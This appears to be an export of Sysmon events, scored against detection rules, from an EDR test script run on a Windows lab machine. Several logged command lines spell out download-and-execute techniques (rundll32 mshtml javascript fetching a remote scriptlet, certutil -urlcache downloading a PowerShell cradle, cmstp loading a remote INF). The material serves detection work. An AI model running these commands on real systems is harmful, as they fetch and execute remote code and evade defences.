Hashes: SHA1=5346C77A5FC3245C79408802D1CBA9E42D707809,MD5=8E5650109EFFB36F456846F2CA14F5B3,SHA256=9DE395721EEE865D97F27734B0EAA3D204384EEE005FC247BE026C24D277AA1C,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 5256
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6648-5D3F-0000-0010B9AB8B00
CommandLine: timeout  5
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:00.299
"
2019-07-29T21:34:01.057426+00:00,Service Binary in Suspicious Folder,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,13,4962,MSEDGEWIN10,"Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\NdisCap\Start
RuleName: ''
EventType: SetValue
ProcessId: 568
ProcessGuid: 747F3D96-DCFC-5D3F-0000-0010F1520000
UtcTime: 2019-07-29 21:34:00.367
Details: DWORD (0x00000001)
"
2019-07-29T21:34:01.090445+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4963,MSEDGEWIN10,"Image: C:\Windows\System32\dispdiag.exe
RuleName: ''
Description: Display Diagnostics
TerminalSessionId: 1
ParentCommandLine: 'netsh  trace start capture=yes filemode=append persistent=yes tracefile=trace.etl    '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 5056
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=272ED6EC0EA0954447FBB1A2BFD5E030FCB8491B,MD5=BBFA0CA006EAB6884B032144DB236410,SHA256=0B5E810C20FC5E8906AA993BB09EA021982C95A8244C2D56518EA16D22F16362,IMPHASH=CB790495654EEEC1710841B2DBCF3C87
ParentProcessGuid: 747F3D96-6647-5D3F-0000-0010AE6E8B00
ProcessId: 3704
CurrentDirectory: C:\Windows\system32\trace\
ProcessGuid: 747F3D96-6648-5D3F-0000-001092BB8B00
CommandLine: C:\Windows\system32\dispdiag.exe -out dispdiag_start.dat
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\netsh.exe
UtcTime: 2019-07-29 21:34:00.415
"
2019-07-29T21:34:01.660499+00:00,Service Binary in Suspicious Folder,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,13,4964,MSEDGEWIN10,"Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\NdisCap\Start
RuleName: ''
EventType: SetValue
ProcessId: 568
ProcessGuid: 747F3D96-DCFC-5D3F-0000-0010F1520000
UtcTime: 2019-07-29 21:34:00.678
Details: DWORD (0x00000003)
"
2019-07-29T21:34:05.237600+00:00,CobaltStrike Load by Rundll32;Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4965,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 6836
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-664D-5D3F-0000-0010F1498C00
CommandLine: cmd  /c rundll32 AllTheThings.dll,EntryPoint
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:05.213
"
2019-07-29T21:34:05.252684+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4966,MSEDGEWIN10,"Image: C:\Windows\System32\timeout.exe
RuleName: ''
Description: timeout - pauses command processing
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=5346C77A5FC3245C79408802D1CBA9E42D707809,MD5=8E5650109EFFB36F456846F2CA14F5B3,SHA256=9DE395721EEE865D97F27734B0EAA3D204384EEE005FC247BE026C24D277AA1C,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 6056
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-664D-5D3F-0000-0010114D8C00
CommandLine: timeout  5
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:05.248
"
2019-07-29T21:34:05.502592+00:00,CobaltStrike Load by Rundll32;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4967,MSEDGEWIN10,"Image: C:\Windows\System32\rundll32.exe
RuleName: ''
Description: Windows host process (Rundll32)
TerminalSessionId: 1
ParentCommandLine: cmd  /c rundll32 AllTheThings.dll,EntryPoint
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 6836
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=F3BA3415DD068A8871F285570BEA2E29874CBFF1,MD5=C73BA51880F5A7FB20C84185A23212EF,SHA256=01B407AF0200B66A34D9B1FA6D9EAAB758EFA36A36BB99B554384F59F8690B1A,IMPHASH=F27A7FC3A53E74F45BE370131953896A
ParentProcessGuid: 747F3D96-664D-5D3F-0000-0010F1498C00
ProcessId: 912
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-664D-5D3F-0000-00108D5B8C00
CommandLine: rundll32  AllTheThings.dll,EntryPoint
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:05.475
"
2019-07-29T21:34:05.542307+00:00,CobaltStrike Load by Rundll32;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4968,MSEDGEWIN10,"Image: C:\Windows\SysWOW64\rundll32.exe
RuleName: ''
Description: Windows host process (Rundll32)
TerminalSessionId: 1
ParentCommandLine: rundll32  AllTheThings.dll,EntryPoint
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 912
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=6778DAD71C8B06264CF2929A5242D2612D3EB026,MD5=2F633406BC9875AA48D6CC5884B70862,SHA256=26E68D4381774A6FD0BF5CA2EACEF55F2AB28536E3176A1C6362DFFC68B22B8A,IMPHASH=BB17B2FBBFF4BBF5EBDCA7D0BB9E4A5B
ParentProcessGuid: 747F3D96-664D-5D3F-0000-00108D5B8C00
ProcessId: 5572
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-664D-5D3F-0000-0010BB5D8C00
CommandLine: rundll32  AllTheThings.dll,EntryPoint
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\rundll32.exe
UtcTime: 2019-07-29 21:34:05.526
"
2019-07-29T21:34:10.373481+00:00,Hacktool - EDR-Freeze Execution;Mshtml.DLL RunHTMLApplication Suspicious Usage;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4969,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 5844
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6652-5D3F-0000-0010B9708C00
CommandLine: cmd  /c rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test"")
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:10.292
"
2019-07-29T21:34:10.388196+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4970,MSEDGEWIN10,"Image: C:\Windows\System32\timeout.exe
RuleName: ''
Description: timeout - pauses command processing
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=5346C77A5FC3245C79408802D1CBA9E42D707809,MD5=8E5650109EFFB36F456846F2CA14F5B3,SHA256=9DE395721EEE865D97F27734B0EAA3D204384EEE005FC247BE026C24D277AA1C,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 5268
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6652-5D3F-0000-001059728C00
CommandLine: timeout  5
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:10.330
"
2019-07-29T21:34:10.708142+00:00,Hacktool - EDR-Freeze Execution;Mshtml.DLL RunHTMLApplication Suspicious Usage;Rundll32 Execution With Uncommon DLL Extension;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4971,MSEDGEWIN10,"Image: C:\Windows\System32\rundll32.exe
RuleName: ''
Description: Windows host process (Rundll32)
TerminalSessionId: 1
ParentCommandLine: cmd  /c rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test"")
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 5844
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=F3BA3415DD068A8871F285570BEA2E29874CBFF1,MD5=C73BA51880F5A7FB20C84185A23212EF,SHA256=01B407AF0200B66A34D9B1FA6D9EAAB758EFA36A36BB99B554384F59F8690B1A,IMPHASH=F27A7FC3A53E74F45BE370131953896A
ParentProcessGuid: 747F3D96-6652-5D3F-0000-0010B9708C00
ProcessId: 348
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6652-5D3F-0000-001058828C00
CommandLine: rundll32.exe  javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test"")
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:10.619
"
2019-07-29T21:34:11.501503+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4973,MSEDGEWIN10,"Image: C:\Windows\System32\calc.exe
RuleName: ''
Description: Windows Calculator
TerminalSessionId: 1
ParentCommandLine: rundll32.exe  javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test"")
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 348
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=F5ED372FD8EC7C455FF66BCE73F16CA51CBC0302,MD5=DEAD69D07BC33B762ABD466FB6F53E11,SHA256=3091E2ABFB55D05D6284B6C4B058B62C8C28AFC1D883B699E9A2B5482EC6FD51,IMPHASH=8EEAA9499666119D13B3F44ECD77A729
ParentProcessGuid: 747F3D96-6652-5D3F-0000-001058828C00
ProcessId: 4888
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6653-5D3F-0000-001083BC8C00
CommandLine: '""C:\Windows\System32\calc.exe"" '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\rundll32.exe
UtcTime: 2019-07-29 21:34:11.486
"
2019-07-29T21:34:15.226408+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;Mshtml.DLL RunHTMLApplication Suspicious Usage;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process;Wscript Shell Run In CommandLine,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4975,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 1808
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6657-5D3F-0000-001029198D00
CommandLine: cmd  /c rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();h=new0ActiveXObject(""WScript.Shell"").run(""calc.exe"",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new0ActiveXObject(""WScript.Shell"").Run(""cmd /c taskkill /f /im rundll32.exe && exit"",0,true);}
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:15.202
"
2019-07-29T21:34:15.252183+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4976,MSEDGEWIN10,"Image: C:\Windows\System32\timeout.exe
RuleName: ''
Description: timeout - pauses command processing
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=5346C77A5FC3245C79408802D1CBA9E42D707809,MD5=8E5650109EFFB36F456846F2CA14F5B3,SHA256=9DE395721EEE865D97F27734B0EAA3D204384EEE005FC247BE026C24D277AA1C,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 2296
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6657-5D3F-0000-0010D01A8D00
CommandLine: timeout  5
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:15.242
"
2019-07-29T21:34:15.658168+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;Mshtml.DLL RunHTMLApplication Suspicious Usage;Rundll32 Execution With Uncommon DLL Extension;Rundll32 Registered COM Objects;UAC Bypass Using NTFS Reparse Point - Process;Wscript Shell Run In CommandLine,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4977,MSEDGEWIN10,"Image: C:\Windows\System32\rundll32.exe
RuleName: ''
Description: Windows host process (Rundll32)
TerminalSessionId: 1
ParentCommandLine: cmd  /c rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();h=new0ActiveXObject(""WScript.Shell"").run(""calc.exe"",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new0ActiveXObject(""WScript.Shell"").Run(""cmd /c taskkill /f /im rundll32.exe && exit"",0,true);}
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1808
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=F3BA3415DD068A8871F285570BEA2E29874CBFF1,MD5=C73BA51880F5A7FB20C84185A23212EF,SHA256=01B407AF0200B66A34D9B1FA6D9EAAB758EFA36A36BB99B554384F59F8690B1A,IMPHASH=F27A7FC3A53E74F45BE370131953896A
ParentProcessGuid: 747F3D96-6657-5D3F-0000-001029198D00
ProcessId: 1004
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6657-5D3F-0000-001011298D00
CommandLine: rundll32.exe  javascript:""\..\mshtml,RunHTMLApplication "";document.write();h=new0ActiveXObject(""WScript.Shell"").run(""calc.exe"",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new0ActiveXObject(""WScript.Shell"").Run(""cmd /c taskkill /f /im rundll32.exe && exit"",0,true);}
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:15.502
"
2019-07-29T21:34:20.238305+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4978,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 7088
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-665C-5D3F-0000-0010096B8D00
CommandLine: 'cmd  /c certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt Default_File_Path2.ps1  '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:20.134
"
2019-07-29T21:34:20.262273+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4979,MSEDGEWIN10,"Image: C:\Windows\System32\timeout.exe
RuleName: ''
Description: timeout - pauses command processing
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=5346C77A5FC3245C79408802D1CBA9E42D707809,MD5=8E5650109EFFB36F456846F2CA14F5B3,SHA256=9DE395721EEE865D97F27734B0EAA3D204384EEE005FC247BE026C24D277AA1C,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 3076
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-665C-5D3F-0000-0010DC6B8D00
CommandLine: timeout  5
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:20.158
"
2019-07-29T21:34:20.459065+00:00,Hacktool - EDR-Freeze Execution;Suspicious Download Via Certutil.EXE;Suspicious File Downloaded From File-Sharing Website Via Certutil.EXE;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4980,MSEDGEWIN10,"Image: C:\Windows\System32\certutil.exe
RuleName: ''
Description: CertUtil.exe
TerminalSessionId: 1
ParentCommandLine: 'cmd  /c certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt Default_File_Path2.ps1  '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 7088
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=459D928381CDDFDC31D03C3DA5C28E63B1190194,MD5=535CF1F8E8CF3382AB8F62013F967DD8,SHA256=85DD6F8EDF142F53746A51D11DCBA853104BB0207CDF2D6C3529917C3C0FC8DF,IMPHASH=683B8A445B00A271FC57848D893BD6C4
ParentProcessGuid: 747F3D96-665C-5D3F-0000-0010096B8D00
ProcessId: 4520
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-665C-5D3F-0000-0010E37B8D00
CommandLine: 'certutil.exe  -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt Default_File_Path2.ps1  '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:20.410
"
2019-07-29T21:34:25.202954+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4983,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 6428
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6661-5D3F-0000-00107AB88D00
CommandLine: cmd  /c cmstp.exe /ni /s https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp.inf
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:25.180
"
2019-07-29T21:34:25.269897+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4984,MSEDGEWIN10,"Image: C:\Windows\System32\timeout.exe
RuleName: ''
Description: timeout - pauses command processing
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=5346C77A5FC3245C79408802D1CBA9E42D707809,MD5=8E5650109EFFB36F456846F2CA14F5B3,SHA256=9DE395721EEE865D97F27734B0EAA3D204384EEE005FC247BE026C24D277AA1C,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 5888
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6661-5D3F-0000-00103CBD8D00
CommandLine: timeout  5
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:25.254
"
